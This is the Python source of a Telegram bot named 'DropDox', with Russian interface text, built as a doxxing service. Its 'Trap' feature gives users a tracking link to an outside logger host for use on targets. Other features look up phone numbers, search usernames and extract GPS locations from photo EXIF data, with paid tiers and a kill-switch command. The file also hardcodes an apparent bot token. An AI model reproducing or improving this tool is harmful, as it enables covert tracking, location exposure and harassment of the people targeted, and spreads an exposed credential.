import logging
import os
import json
import requests
import phonenumbers
from datetime import datetime, timedelta
from PIL import Image
from PIL.ExifTags import TAGS
from phonenumbers import carrier, geocoder
from aiogram import Bot, Dispatcher, executor, types

# --- [ КОНФИГУРАЦИЯ ] ---
API_TOKEN = '8504796844:AAGVerEJuDpiCiR-HxyP7t2GAfY-dFgAq3k'
OWNER_ID = 8380479728 
LOGGER_URL = "https://portfolio-myweb.up.railway.app/track"
DATA_FILE = "users_db.json"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

# --- [ РАБОТА С БАЗОЙ ] ---
def load_db():
    if not os.path.exists(DATA_FILE):
        return {"premium": {}, "admins": [], "banned": []}
    try:
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    except:
        return {"premium": {}, "admins": [], "banned": []}

def save_db(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)

def get_role(user_id):
    if user_id == OWNER_ID: return "Owner"
    db = load_db()
    if user_id in db["banned"]: return "Banned"
    if user_id in db["admins"]: return "Admin"
    
    uid_str = str(user_id)
    if uid_str in db["premium"]:
        expiry = datetime.strptime(db["premium"][uid_str], "%Y-%m-%d")
        if datetime.now() <= expiry:
            return "Premium"
        else:
            del db["premium"][uid_str]
            save_db(db)
    return "User"

def get_decimal_coords(gps_info):
    try:
        def convert(v):
            return float(v[0]) + (float(v[1]) / 60.0) + (float(v[2]) / 3600.0)
        lat = convert(gps_info[2])
        if gps_info[1] != 'N': lat = -lat
        lon = convert(gps_info[4])
        if gps_info[3] != 'E': lon = -lon
        return lat, lon
    except: return None

# --- [ КОМАНДЫ УПРАВЛЕНИЯ ] ---
@dp.message_handler(commands=['give_access'])
async def give_access(m: types.Message):
    if get_role(m.from_user.id) not in ["Owner", "Admin"]: return
    try:
        args = m.get_args().split()
        target_id, days = args[0], int(args[1])
        db = load_db()
        expiry = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")
        db["premium"][target_id] = expiry
        save_db(db)
        await m.answer(f"✅ Доступ для {target_id} до {expiry}")
    except: await m.answer("Юзать: /give_access ID ДНИ")

@dp.message_handler(commands=['ban'])
async def cmd_ban(m: types.Message):
    if get_role(m.from_user.id) not in ["Owner", "Admin"]: return
    try:
        uid = int(m.get_args())
        if uid == OWNER_ID: return
        db = load_db()
        if uid not in db["banned"]: db["banned"].append(uid)
        save_db(db)
        await m.answer(f"🚫 ID {uid} забанен.")
    except: await m.answer("Юзай: /ban ID")

# --- [ ОСНОВНОЕ МЕНЮ ] ---
@dp.message_handler(commands=['start'])
async def start(m: types.Message):
    role = get_role(m.from_user.id)
    if role == "Banned": return
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("🪤 Trap", "📱 Dox Phone")
    if role in ["Premium", "Admin", "Owner"]: kb.add("👤 Dox User", "🖼 EXIF Data")
    if role in ["Owner", "Admin"]: kb.add("🚨 Panic", "📊 Stats")
    await m.answer(f"🦾 <b>DropDox v0.4.0</b>\nТвой статус: <b>{role}</b>", reply_markup=kb, parse_mode="HTML")

# --- [ ФУНКЦИИ ПРОБИВА ] ---
@dp.message_handler(lambda m: m.text == "🪤 Trap")
async def trap(m: types.Message):
    await m.answer(f"🔗 Ссылка-капкан:\n<code>{LOGGER_URL}?id={m.from_user.id}</code>", parse_mode="HTML")

@dp.message_handler(lambda m: m.text.startswith('+'))
async def dox_ph(m: types.Message):
    try:
        num = phonenumbers.parse(m.text)
        res = f"📡 Опер: {carrier.name_for_number(num, 'ru')}\n🌍 Регион: {geocoder.description_for_number(num, 'ru')}"
        await m.answer(f"🔍 <b>Результат:</b>\n{res}\n\n🔗 <a href='https://www.google.com/search?q=%22{m.text}%22'>Google</a>", parse_mode="HTML")
    except: await m.answer("❌ Ошибка формата.")

@dp.message_handler(lambda m: m.text == "👤 Dox User" or (m.text and m.text.startswith('@')))
async def dox_us(m: types.Message):
    if get_role(m.from_user.id) == "User":
        return await m.answer("⭐ Купи Premium для поиска по нику.")
    user = m.text.replace('@', '')
    if user == "👤 Dox User": return await m.answer("Введи @username")
    res = f"👤 <b>Ник {user}:</b>\n🔗 <a href='https://t.me/{user}'>Telegram</a>\n🔗 <a href='https://www.google.com/search?q={user}'>Google</a>"
    await m.answer(res, parse_mode="HTML", disable_web_page_preview=True)

@dp.message_handler(content_types=['document', 'photo'])
async def exif_handler(m: types.Message):
    if get_role(m.from_user.id) == "User": return await m.answer("⭐ EXIF доступен только Premium.")
    await m.answer("📥 Анализ метаданных...")
    f_id = m.document.file_id if m.document else m.photo[-1].file_id
    f_info = await bot.get_file(f_id)
    f_down = await bot.download_file(f_info.file_path)
    with open("temp.jpg", 'wb') as f: f.write(f_down.read())
    try:
        img = Image.open("temp.jpg")
        info = img._getexif()
        if not info: return await m.answer("ℹ️ Нет EXIF. Шли файлом.")
        make, model, map_link = "N/A", "N/A", None
        for t, v in info.items():
            tag = TAGS.get(t, t)
            if tag == "Make": make = v
            if tag == "Model": model = v
            if tag == "GPSInfo":
                coords = get_decimal_coords(v)
                if coords: map_link = f"https://www.google.com/maps?q={coords[0]},{coords[1]}&t=k"
        res = f"🖼 <b>Метаданные:</b>\n📱 {make} {model}"
        if map_link: res += f"\n📍 <a href='{map_link}'>КАРТА (Спутник)</a>"
        await m.answer(res, parse_mode="HTML")
    except Exception as e: await m.answer(f"❌ Ошибка: {e}")
    finally: 
        if os.path.exists("temp.jpg"): os.remove("temp.jpg")

@dp.message_handler(lambda m: m.text in ["🚨 Panic", "📊 Stats"])
async def adm_tools(m: types.Message):
    role = get_role(m.from_user.id)
    if role not in ["Owner", "Admin"]: return
    if m.text == "📊 Stats":
        db = load_db()
        await m.answer(f"📊 <b>Статистика:</b>\nПремиум: {len(db['premium'])}\nБаны: {len(db['banned'])}", parse_mode="HTML")
    else: os._exit(0)

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
                   
